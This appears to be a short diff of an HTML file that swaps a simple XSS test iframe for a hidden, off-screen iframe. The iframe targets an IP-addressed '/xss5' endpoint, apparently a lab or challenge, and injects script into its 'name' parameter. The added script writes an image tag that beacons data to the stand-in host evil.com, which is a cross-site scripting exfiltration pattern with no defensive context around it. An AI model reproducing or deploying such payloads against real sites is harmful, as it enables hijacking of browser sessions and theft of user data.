@@ -1,5 +1,2 @@
-<iframe src=http://54.37.156.50:5000/xss5?name width="300" height="600"
-<body>
-<script>alert('XSS')</script>
-</boys>
-</iframe>
+<iframe style="position:absolute;top:-9999px" src="http://54.37.156.50:5000/xss5?name=<script>document.write('<img src=\"http://evil.com/↵
+    ?c='+encodeURIComponent(alert('XSS'))+'\">')</script>"></iframe>
